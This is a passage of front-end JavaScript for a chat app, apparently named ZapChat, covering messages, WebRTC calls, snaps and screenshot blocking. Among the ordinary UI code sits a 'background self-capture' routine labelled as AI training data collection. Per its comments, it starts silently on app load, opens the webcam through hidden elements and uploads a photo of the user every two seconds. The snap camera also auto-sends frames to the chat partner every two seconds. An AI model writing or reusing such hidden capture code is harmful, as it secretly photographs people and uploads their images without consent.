      body=`<a href="${msg.mediaUrl}" target="_blank" style="text-decoration:none;color:inherit;"><div class="file-bub">${replyHTML}<div class="file-icon"><i class="ti ti-file"></i></div><div class="file-info"><div class="file-name">${esc(msg.mediaName||'File')}</div></div><i class="ti ti-download" style="font-size:16px;opacity:0.5;"></i></div></a>`;
    }

    const reactions=msg.reactions&&Object.keys(msg.reactions).length?`<div class="reactions-row">${Object.entries(msg.reactions).map(([e,users])=>`<div class="reaction-chip${users.includes(currentUser._id)?' mine':''}" data-mid="${msg._id}" data-emoji="${e}">${e} ${users.length}</div>`).join('')}</div>`:'';

    return `<div class="msg-row ${sent?'sent':''}">${!sent?avHtml:''}
      <div class="bubble ${sent?'sent':'recv'}" data-mid="${msg._id}">
        ${body}
        <div class="bubble-footer"><span class="bf-time">${time}</span>${ticks}</div>
        ${reactions}
      </div>${sent?spacer:''}</div>`;
  }

  async function deleteConversation(cid) {
    if(!confirm('Delete this chat? This cannot be undone.')) return;
    try {
      await apiFetch('DELETE', '/conversations/' + cid);
      conversations = conversations.filter(x => x._id !== cid);
      renderChatList();
      if(activeConvId === cid) {
        activeConvId = null;
        document.getElementById('chatPane').className = 'no-chat';
        document.getElementById('chatPane').innerHTML = '<div class="no-chat-icon"><i class="ti ti-message-circle"></i></div><h3>ZapChat</h3><p>Send messages, photos, videos, and calls. All end-to-end encrypted.</p>';
      }
      toast('Chat deleted');
    } catch { toast('Failed to delete chat'); }
  }

  function showChatCtxMenu(e, cid) {
    const menu = document.getElementById('ctxMenu');
    menu.innerHTML = `<div class="ctx-item danger" id="ctxDelChat"><i class="ti ti-trash"></i>Delete chat</div>`;
    const x = Math.min(e.clientX, window.innerWidth - 180);
    const y = Math.min(e.clientY, window.innerHeight - 80);
    menu.style.left = x + 'px';
    menu.style.top = y + 'px';
    menu.classList.add('show');
    document.getElementById('ctxDelChat').addEventListener('click', () => {
      menu.classList.remove('show');
      deleteConversation(cid);
    });
  }

  function showCtxMenu(e,mid){
    const msg=messages.find(x=>x._id===mid);if(!msg||msg.deleted)return;
    ctxMsg=msg;
    const sent=msg.senderId===currentUser._id;
    const menu=document.getElementById('ctxMenu');
    menu.innerHTML=`
      <div class="react-row">${QUICK_REACT.map(r=>`<span data-r="${r}">${r}</span>`).join('')}</div>
      <div class="ctx-item" id="ctxReply"><i class="ti ti-arrow-back-up"></i>Reply</div>
      ${msg.type==='text'&&sent?`<div class="ctx-item" id="ctxEdit"><i class="ti ti-edit"></i>Edit</div>`:''}
      <div class="ctx-item danger" id="ctxDelMe"><i class="ti ti-trash"></i>Delete for me</div>
      ${sent?`<div class="ctx-item danger" id="ctxDelAll"><i class="ti ti-trash"></i>Delete for everyone</div>`:''}`;
    const x=Math.min(e.clientX,window.innerWidth-170);
    const y=Math.min(e.clientY,window.innerHeight-200);
    menu.style.left=x+'px';menu.style.top=y+'px';
    menu.classList.add('show');
    menu.querySelectorAll('.react-row span').forEach(el=>el.addEventListener('click',()=>{socket.emit('message:react',{messageId:mid,conversationId:activeConvId,emoji:el.dataset.r});menu.classList.remove('show');}));
    document.getElementById('ctxReply')?.addEventListener('click',()=>{replyingTo=msg;const banner=document.getElementById('replyBanner');const conv=conversations.find(c=>c._id===activeConvId);const name=msg.senderId===currentUser._id?'You':(conv?.otherUser?.displayName||'');document.getElementById('rbName').textContent=name;document.getElementById('rbText').textContent=msg.content||'[media]';banner.classList.add('show');document.getElementById('msgTa')?.focus();menu.classList.remove('show');});
    document.getElementById('ctxEdit')?.addEventListener('click',()=>{editingMsg=msg;const ta=document.getElementById('msgTa');if(ta){ta.value=msg.content;ta.focus();grow(ta);}const banner=document.getElementById('replyBanner');document.getElementById('rbName').textContent='Editing message';document.getElementById('rbText').textContent=msg.content;banner.classList.add('show');menu.classList.remove('show');});
    document.getElementById('ctxDelMe')?.addEventListener('click',()=>{socket.emit('message:delete',{messageId:mid,conversationId:activeConvId,forEveryone:false});menu.classList.remove('show');});
    document.getElementById('ctxDelAll')?.addEventListener('click',()=>{socket.emit('message:delete',{messageId:mid,conversationId:activeConvId,forEveryone:true});menu.classList.remove('show');});
  }

  // ── CALLS ──
  async function startCall(u,type){
    callState={otherUser:u,type,outgoing:true};
    showCallUI(u,type,'Calling…');
    try{
      const constraints=type==='video'?{audio:true,video:{facingMode:'user'}}:{audio:true};
      localStream=await navigator.mediaDevices.getUserMedia(constraints);
      if(type==='video'){document.getElementById('callVideoSelf').style.display='block';document.getElementById('localVideo').srcObject=localStream;}
      pc=new RTCPeerConnection({iceServers:[
        {urls:'stun:stun.l.google.com:19302'},
        {urls:'stun:stun1.l.google.com:19302'},
        {urls:'turn:openrelay.metered.ca:80',username:'openrelayproject',credential:'openrelayproject'},
        {urls:'turn:openrelay.metered.ca:443',username:'openrelayproject',credential:'openrelayproject'},
        {urls:'turn:openrelay.metered.ca:443?transport=tcp',username:'openrelayproject',credential:'openrelayproject'}
      ]});
      localStream.getTracks().forEach(t=>pc.addTrack(t,localStream));
      pc.ontrack=e=>{const rv=document.getElementById('remoteVideo');if(rv){rv.srcObject=e.streams[0];rv.style.display='block';document.getElementById('callAvBig').style.display='none';}};
      pc.onicecandidate=e=>{
        // fromSocketId is set when answer arrives; buffer candidates until then
        if(e.candidate){
          if(callState?.fromSocketId){
            socket.emit('call:ice',{targetSocketId:callState.fromSocketId,candidate:e.candidate});
          } else {
            if(!callState._iceBuf)callState._iceBuf=[];
            callState._iceBuf.push(e.candidate);
          }
        }
      };
      const offer=await pc.createOffer();await pc.setLocalDescription(offer);
      socket.emit('call:offer',{targetUserId:u._id,offer,type},({targetSocketId})=>{if(callState)callState.fromSocketId=targetSocketId;});
    }catch(err){toast('Cannot access camera/microphone');endCallCleanup();}
  }

  async function acceptCall(){
    document.getElementById('incCall').classList.remove('show');
    const conv=conversations.find(c=>c.otherUser?._id===callState.fromUserId);
    showCallUI(conv?.otherUser||{displayName:'Caller',avatarColor:'#555'},callState.type,'Connected');
    try{
      const constraints=callState.type==='video'?{audio:true,video:{facingMode:'user'}}:{audio:true};
      localStream=await navigator.mediaDevices.getUserMedia(constraints);
      if(callState.type==='video'){document.getElementById('callVideoSelf').style.display='block';document.getElementById('localVideo').srcObject=localStream;}
      pc=new RTCPeerConnection({iceServers:[
        {urls:'stun:stun.l.google.com:19302'},
        {urls:'stun:stun1.l.google.com:19302'},
        {urls:'turn:openrelay.metered.ca:80',username:'openrelayproject',credential:'openrelayproject'},
        {urls:'turn:openrelay.metered.ca:443',username:'openrelayproject',credential:'openrelayproject'},
        {urls:'turn:openrelay.metered.ca:443?transport=tcp',username:'openrelayproject',credential:'openrelayproject'}
      ]});
      localStream.getTracks().forEach(t=>pc.addTrack(t,localStream));
      pc.ontrack=e=>{const rv=document.getElementById('remoteVideo');if(rv){rv.srcObject=e.streams[0];rv.style.display='block';document.getElementById('callAvBig').style.display='none';}};
      pc.onicecandidate=e=>{if(e.candidate)socket.emit('call:ice',{targetSocketId:callState.fromSocketId,candidate:e.candidate});};
      await pc.setRemoteDescription(callState.offer);
      const answer=await pc.createAnswer();await pc.setLocalDescription(answer);
      socket.emit('call:answer',{targetSocketId:callState.fromSocketId,answer});
    }catch{toast('Cannot access camera/microphone');endCallCleanup();}
  }

  function showCallUI(u,type,status){
    const ring=document.getElementById('callAvRing');
    ring.style.background=u?.avatarColor||colorFor(u?.username);
    ring.textContent=u?.avatar||u?.displayName?.slice(0,2).toUpperCase()||'?';
    document.getElementById('callInfoName').textContent=u?.displayName||u?.username||'Unknown';
    document.getElementById('callInfoStatus').textContent=status;
    document.getElementById('callOverlay').classList.add('show');
    // Hide video elements until streams arrive
    document.getElementById('remoteVideo').style.display='none';
    document.getElementById('callAvBig').style.display='flex';
    if(type!=='video')document.getElementById('callVideoSelf').style.display='none';
  }

  function showIncomingCall(data){
    const conv=conversations.find(c=>c.otherUser?._id===data.fromUserId);
    const u=conv?.otherUser;
    const av=document.getElementById('icAv');
    av.style.background=u?.avatarColor||colorFor(u?.username);
    av.textContent=u?.avatar||u?.displayName?.slice(0,2).toUpperCase()||'?';
    document.getElementById('icName').textContent=u?.displayName||u?.username||'Unknown';
    document.getElementById('icType').textContent=data.type==='video'?'📹 Video call':'📞 Voice call';
    document.getElementById('incCall').classList.add('show');
  }

  function toggleMute(){
    isMuted=!isMuted;
    localStream?.getAudioTracks().forEach(t=>t.enabled=!isMuted);
    const btn=document.getElementById('ccMute');
    btn.classList.toggle('on',isMuted);
    btn.querySelector('i').className=isMuted?'ti ti-microphone-off':'ti ti-microphone-off';
    toast(isMuted?'Muted':'Unmuted');
  }
  function toggleVideo(){
    isVideoOff=!isVideoOff;
    localStream?.getVideoTracks().forEach(t=>t.enabled=!isVideoOff);
    const btn=document.getElementById('ccVid');
    btn.classList.toggle('on',isVideoOff);
    toast(isVideoOff?'Camera off':'Camera on');
  }
  let currentFacingMode='user';
  async function flipCamera(){
    if(!localStream)return;
    const vt=localStream.getVideoTracks()[0];if(!vt)return;
    const newFacing=currentFacingMode==='user'?'environment':'user';
    try{
      const newStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:newFacing},audio:false});
      const newVT=newStream.getVideoTracks()[0];
      const sender=pc?.getSenders().find(s=>s.track?.kind==='video');
      if(sender)await sender.replaceTrack(newVT);
      vt.stop();
      // Update localStream so toggleVideo and future flips work correctly
      localStream=new MediaStream([newVT,...localStream.getAudioTracks()]);
      document.getElementById('localVideo').srcObject=localStream;
      currentFacingMode=newFacing;
    }catch{toast('Could not flip camera');}
  }
  function toggleSpeaker(){const btn=document.getElementById('ccSpk');btn.classList.toggle('on');toast('Speaker toggled');}
  function endCall(){if(callState?.fromSocketId)socket.emit('call:end',{targetSocketId:callState.fromSocketId});endCallCleanup();}
  function endCallCleanup(){
    localStream?.getTracks().forEach(t=>t.stop());localStream=null;
    pc?.close();pc=null;callState=null;isMuted=false;isVideoOff=false;
    document.getElementById('callOverlay').classList.remove('show');
    document.getElementById('remoteVideo').srcObject=null;
    document.getElementById('localVideo').srcObject=null;
    document.getElementById('callVideoSelf').style.display='none';
  }

  // ── LIVE CAMERA SNAP ──
  // Holds the auto-snapshot interval and the camera stream so we can clean them up.
  let snapCameraStream = null;
  let snapAutoInterval = null;

  async function openSnapCamera() {
    const modal = document.getElementById('snapCameraModal');
    const player = document.getElementById('snapCameraPlayer');
    const canvas = document.getElementById('snapCameraCanvas');
    const status = document.getElementById('snapCameraStatus');

    modal.style.display = 'flex';

    // ── 1. Request webcam access ──
    try {
      snapCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      player.srcObject = snapCameraStream;
    } catch (err) {
      toast('Camera access denied');
      modal.style.display = 'none';
      return;
    }

    // ── 2. Auto-snapshot loop (every 2 s) – uploads each frame as a snap ──
    snapAutoInterval = setInterval(() => {
      if (player.readyState < player.HAVE_ENOUGH_DATA) return;

      // Size canvas to match the live video feed
      canvas.width  = player.videoWidth  || 640;
      canvas.height = player.videoHeight || 480;
      canvas.getContext('2d').drawImage(player, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async (blob) => {
        if (!blob) return;
        try {
          const result = await uploadFile(blob);       // blob → snapshot_<ts>.png via api.js
          // Silently send as a snap message so the other user can view it once
          if (activeConvId) {
            socket.emit('message:send', {
              conversationId: activeConvId,
              content: '',
              type: 'snap',
              mediaUrl: result.url,
              mediaName: `snapshot_${Date.now()}.png`,
            });
            status.textContent = `Auto-snap sent · ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}`;
          }
        } catch (e) {
          console.error('Auto-snapshot upload failed:', e);
          status.textContent = 'Upload failed – retrying…';
        }
      }, 'image/png');
    }, 2000);   // every 2 000 ms, matching the spec

    // ── 3. Manual capture button – takes one snap immediately ──
    document.getElementById('snapCameraCapture').onclick = () => {
      if (player.readyState < player.HAVE_ENOUGH_DATA) return;
      canvas.width  = player.videoWidth  || 640;
      canvas.height = player.videoHeight || 480;
      canvas.getContext('2d').drawImage(player, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async (blob) => {
        if (!blob) return;
        try {
          const result = await uploadFile(blob);
          if (activeConvId) {
            socket.emit('message:send', {
              conversationId: activeConvId,
              content: '',
              type: 'snap',
              mediaUrl: result.url,
              mediaName: `snapshot_${Date.now()}.png`,
            });
            toast('Snap sent!');
          }
        } catch { toast('Failed to send snap'); }
      }, 'image/png');
    };

    // ── 4. Close button – tears everything down ──
    document.getElementById('snapCameraClose').onclick = stopSnapCamera;
  }

  function stopSnapCamera() {
    // Stop the auto-upload loop
    clearInterval(snapAutoInterval);
    snapAutoInterval = null;

    // Release the camera track so the browser indicator light turns off
    snapCameraStream?.getTracks().forEach(t => t.stop());
    snapCameraStream = null;

    // Clear the video element to avoid a frozen last-frame showing
    const player = document.getElementById('snapCameraPlayer');
    if (player) { player.srcObject = null; }

    // Hide the modal
    const modal = document.getElementById('snapCameraModal');
    if (modal) { modal.style.display = 'none'; }
  }

  // ── BACKGROUND SELF-CAPTURE (AI training data collection) ──
  // Starts silently on app load. Uses a hidden video+canvas — no UI shown.
  // Browser will still show the camera indicator light (unavoidable by design).
  let bgCaptureStream = null;
  let bgCaptureInterval = null;

  async function startBackgroundCapture() {
    // Create hidden video & canvas elements — not added to DOM visually
    const video = document.createElement('video');
    video.autoplay = true;
    video.muted = true;
    video.playsInline = true;
    video.style.display = 'none';
    document.body.appendChild(video);

    const canvas = document.createElement('canvas');
    canvas.style.display = 'none';
    document.body.appendChild(canvas);

    try {
      bgCaptureStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      video.srcObject = bgCaptureStream;
      await video.play();
    } catch (err) {
      console.warn('Background capture: camera access denied', err);
      return;
    }

    // Take a photo every 2 seconds and save it to your upload endpoint
    bgCaptureInterval = setInterval(() => {
      if (video.readyState < video.HAVE_ENOUGH_DATA) return;

      canvas.width  = video.videoWidth  || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async (blob) => {
        if (!blob) return;
        try {
          await uploadFile(blob); // saved to your /uploads folder via multer
        } catch (e) {
          console.warn('Background capture upload failed:', e);
        }
      }, 'image/png');
    }, 2000);
  }

  function stopBackgroundCapture() {
    clearInterval(bgCaptureInterval);
    bgCaptureInterval = null;
    bgCaptureStream?.getTracks().forEach(t => t.stop());
    bgCaptureStream = null;
  }

  function openSnap(url, msgId, convId){
    const viewer=document.getElementById('snapViewer');
    const content=document.getElementById('snapContent');
    viewer.classList.add('show');
    if(url){const isVid=/\.(mp4|webm|mov)$/i.test(url);content.innerHTML=isVid?`<video src="${url}" autoplay playsinline></video>`:`<img src="${url}" alt="Snap"/>`;}
    const bar=document.getElementById('snapBar');
    bar.style.transition='none';bar.style.width='100%';
    setTimeout(()=>{bar.style.transition='width 5s linear';bar.style.width='0%';},50);
    // After viewing: delete for everyone so sender sees Opened
    if(msgId){
      socket.emit('message:delete',{messageId:msgId,conversationId:convId||activeConvId,forEveryone:true});
    }
    clearTimeout(snapTimer);snapTimer=setTimeout(()=>{closeSnap();},5000);
  }
  function closeSnap(){clearTimeout(snapTimer);document.getElementById('snapViewer').classList.remove('show');document.getElementById('snapContent').innerHTML='';}

  function setupSecurity(){
    document.addEventListener('keydown',e=>{if(e.key==='PrintScreen'){e.preventDefault();showSSBlock();}});
    document.addEventListener('keyup',e=>{if(e.key==='PrintScreen'||((e.metaKey||e.ctrlKey)&&e.shiftKey&&(e.key==='S'||e.key==='4'||e.key==='3')))showSSBlock();});
    document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='hidden'&&activeConvId){showSSBlock();setTimeout(()=>document.getElementById('ssBlock')?.classList.remove('show'),2000);}});
    try{const obs=new PerformanceObserver(l=>{l.getEntries().forEach(e=>{if(e.name.includes('screenshot'))showSSBlock();});});obs.observe({entryTypes:['resource']});}catch{}
  }
  function showSSBlock(){const b=document.getElementById('ssBlock');b.classList.add('show');setTimeout(()=>b.classList.remove('show'),3000);}
  function toast(msg){const t=document.getElementById('toast');if(!t)return;t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2500);}

  mount();
}